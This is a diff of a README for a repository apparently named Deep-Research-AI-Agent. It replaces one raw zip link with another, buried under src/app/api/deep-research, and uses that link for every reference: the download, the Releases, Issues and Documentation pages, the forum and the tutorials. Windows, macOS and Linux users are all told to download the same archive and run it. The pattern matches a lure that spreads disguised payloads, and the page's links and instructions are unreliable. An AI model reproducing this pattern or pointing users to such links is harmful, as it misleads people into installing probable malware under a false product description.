@@ -1,6 +1,6 @@
 # 🤖 Deep-Research-AI-Agent - Your Smart Research Assistant
 
-[![Download Deep-Research-AI-Agent](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip)](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip)
+[![Download Deep-Research-AI-Agent](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip)](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 ### 2. Visit the Releases Page
 
-To download the software, you need to visit our [Releases page](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip). This page will have the latest version of the application.
+To download the software, you need to visit our [Releases page](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip). This page will have the latest version of the application.
 
 ### 3. Download the Application
 
@@ -30,9 +30,9 @@ On the Releases page, find the latest version listed at the top. Click the downl
 
 Here’s a breakdown of what you might see:
 
-- **For Windows:** Click on the file named `https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip`.
-- **For macOS:** Click on `https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip`.
-- **For Linux:** Click on `https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip`.
+- **For Windows:** Click on the file named `https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip`.
+- **For macOS:** Click on `https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip`.
+- **For Linux:** Click on `https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip`.
 
 Each file will have a size indication, and you can check this before downloading.
 
@@ -41,18 +41,18 @@ Each file will have a size indication, and you can check this before downloading
 #### For Windows:
 
 1. Locate the downloaded file, usually in the "Downloads" folder.
-2. Double-click the `https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip` file.
+2. Double-click the `https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip` file.
 3. Follow the on-screen prompts to complete the installation.
 
 #### For macOS:
 
-1. Open the downloaded `https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip` file.
+1. Open the downloaded `https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip` file.
 2. Drag the Deep-Research-AI-Agent icon to your Applications folder.
 3. Eject the mounted image from Finder once the copying is complete.
 
 #### For Linux:
 
-1. Extract the downloaded `https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip` file.
+1. Extract the downloaded `https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the application by executing `./Deep-Research-AI-Agent`.
 
@@ -72,7 +72,7 @@ Once the application is open, you will see a simple and user-friendly interface.
 
 ## 📥 Download & Install
 
-For easy access, you can always return to the [Releases page](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip) to get the most recent updates or reinstall the application if needed.
+For easy access, you can always return to the [Releases page](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip) to get the most recent updates or reinstall the application if needed.
 
 ### Troubleshooting
 
@@ -86,15 +86,15 @@ For easy access, you can always return to the [Releases page](https://raw.github
 
 For help or questions, you can open an issue in the GitHub repository. 
 
-1. Go to the [Issues page](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip).
+1. Go to the [Issues page](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip).
 2. Click on "New Issue" and enter your query.
 
 We aim to respond within 48 hours.
 
 ## 📚 Resources
 
-- [Documentation](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip)
-- [User Forum](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip) (forum for community support)
-- [Tutorial Videos](https://raw.githubusercontent.com/Adam10-b/Deep-Research-AI-Agent/main/contritely/Deep-Research-AI-Agent.zip) (step-by-step guidance)
+- [Documentation](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip)
+- [User Forum](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip) (forum for community support)
+- [Tutorial Videos](https://github.com/Adam10-b/Deep-Research-AI-Agent/raw/refs/heads/main/src/app/api/deep-research/Deep-Agent-Research-A-3.7.zip) (step-by-step guidance)
 
 Thank you for choosing Deep-Research-AI-Agent. Enjoy enhancing your research workflow with AI!
